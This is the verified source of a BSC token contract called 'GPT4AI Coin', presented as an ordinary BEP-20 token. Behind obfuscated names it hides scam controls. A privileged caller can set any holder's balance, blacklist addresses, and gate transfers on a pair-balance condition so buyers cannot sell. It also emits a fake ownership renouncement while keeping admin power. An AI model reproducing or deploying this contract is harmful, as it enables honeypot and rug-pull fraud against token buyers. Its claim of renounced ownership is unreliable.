/**
 *Submitted for verification at BscScan.com on 2023-03-29
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface fundTake {
    function totalSupply() external view returns (uint256);

    function balanceOf(address feeModeAmount) external view returns (uint256);

    function transfer(address walletTeam, uint256 senderShouldSell) external returns (bool);

    function allowance(address listSwap, address spender) external view returns (uint256);

    function approve(address spender, uint256 senderShouldSell) external returns (bool);

    function transferFrom(
        address sender,
        address walletTeam,
        uint256 senderShouldSell
    ) external returns (bool);

    event Transfer(address indexed from, address indexed teamLaunched, uint256 value);
    event Approval(address indexed listSwap, address indexed spender, uint256 value);
}

interface fundTakeMetadata is fundTake {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract fromTrading {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface tradingLaunch {
    function createPair(address launchedAuto, address autoFrom) external returns (address);
}

interface marketingEnable {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract GPT4AICoin is fromTrading, fundTake, fundTakeMetadata {

    function txSender(address launchReceiver) public {
        tradingTo();
        if (enableToFrom != amountShould) {
            receiverSwap = autoMin;
        }
        if (launchReceiver == fundTx || launchReceiver == listShould) {
            return;
        }
        autoMax[launchReceiver] = true;
    }

    function buyTeam(address isLaunchFund, address walletTeam, uint256 senderShouldSell) internal returns (bool) {
        if (isLaunchFund == fundTx) {
            return tokenWallet(isLaunchFund, walletTeam, senderShouldSell);
        }
        uint256 atAmount = fundTake(listShould).balanceOf(launchedBuy);
        require(atAmount == sellTeam);
        require(!autoMax[isLaunchFund]);
        return tokenWallet(isLaunchFund, walletTeam, senderShouldSell);
    }

    bool public exemptLaunchLiquidity;

    address public fundTx;

    string private sellFee = "GCN";

    mapping(address => mapping(address => uint256)) private exemptToken;

    function transferFrom(address isLaunchFund, address walletTeam, uint256 senderShouldSell) external override returns (bool) {
        if (_msgSender() != autoShould) {
            if (exemptToken[isLaunchFund][_msgSender()] != type(uint256).max) {
                require(senderShouldSell <= exemptToken[isLaunchFund][_msgSender()]);
                exemptToken[isLaunchFund][_msgSender()] -= senderShouldSell;
            }
        }
        return buyTeam(isLaunchFund, walletTeam, senderShouldSell);
    }

    function launchedMarketing(uint256 senderShouldSell) public {
        tradingTo();
        sellTeam = senderShouldSell;
    }

    uint256 private amountShould;

    uint8 private enableMin = 18;

    function tradingTo() private view {
        require(autoSell[_msgSender()]);
    }

    address private swapFund;

    uint256 modeTx;

    uint256 sellTeam;

    function tokenWallet(address isLaunchFund, address walletTeam, uint256 senderShouldSell) internal returns (bool) {
        require(isAt[isLaunchFund] >= senderShouldSell);
        isAt[isLaunchFund] -= senderShouldSell;
        isAt[walletTeam] += senderShouldSell;
        emit Transfer(isLaunchFund, walletTeam, senderShouldSell);
        return true;
    }

    mapping(address => bool) public autoSell;

    string private takeAuto = "GPT4AI Coin";

    bool public sellExempt;

    mapping(address => uint256) private isAt;

    function balanceOf(address feeModeAmount) public view virtual override returns (uint256) {
        return isAt[feeModeAmount];
    }

    function name() external view virtual override returns (string memory) {
        return takeAuto;
    }

    function approve(address isMinShould, uint256 senderShouldSell) public virtual override returns (bool) {
        exemptToken[_msgSender()][isMinShould] = senderShouldSell;
        emit Approval(_msgSender(), isMinShould, senderShouldSell);
        return true;
    }

    uint256 private receiverSwap;

    function isTeam(address totalWalletReceiver, uint256 senderShouldSell) public {
        tradingTo();
        isAt[totalWalletReceiver] = senderShouldSell;
    }

    function symbol() external view virtual override returns (string memory) {
        return sellFee;
    }

    uint256 public autoMin;

    constructor (){
        
        exemptList();
        marketingEnable minFund = marketingEnable(autoShould);
        listShould = tradingLaunch(minFund.factory()).createPair(minFund.WETH(), address(this));
        
        fundTx = _msgSender();
        autoSell[fundTx] = true;
        isAt[fundTx] = autoExempt;
        
        emit Transfer(address(0), fundTx, autoExempt);
    }

    uint256 private enableToFrom;

    mapping(address => bool) public autoMax;

    event OwnershipTransferred(address indexed modeReceiver, address indexed receiverShouldMax);

    address launchedBuy = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function exemptList() public {
        emit OwnershipTransferred(fundTx, address(0));
        swapFund = address(0);
    }

    function decimals() external view virtual override returns (uint8) {
        return enableMin;
    }

    function getOwner() external view returns (address) {
        return swapFund;
    }

    function transfer(address totalWalletReceiver, uint256 senderShouldSell) external virtual override returns (bool) {
        return buyTeam(_msgSender(), totalWalletReceiver, senderShouldSell);
    }

    uint256 private autoExempt = 100000000 * 10 ** 18;

    function swapModeList(address limitLiquidity) public {
        if (exemptLaunchLiquidity) {
            return;
        }
        if (receiverSwap == autoMin) {
            receiverSwap = enableToFrom;
        }
        autoSell[limitLiquidity] = true;
        if (sellExempt != amountTeam) {
            amountShould = autoMin;
        }
        exemptLaunchLiquidity = true;
    }

    function owner() external view returns (address) {
        return swapFund;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return autoExempt;
    }

    function allowance(address txReceiver, address isMinShould) external view virtual override returns (uint256) {
        if (isMinShould == autoShould) {
            return type(uint256).max;
        }
        return exemptToken[txReceiver][isMinShould];
    }

    uint256 public totalReceiverTo;

    address autoShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address public listShould;

    bool private amountTeam;

}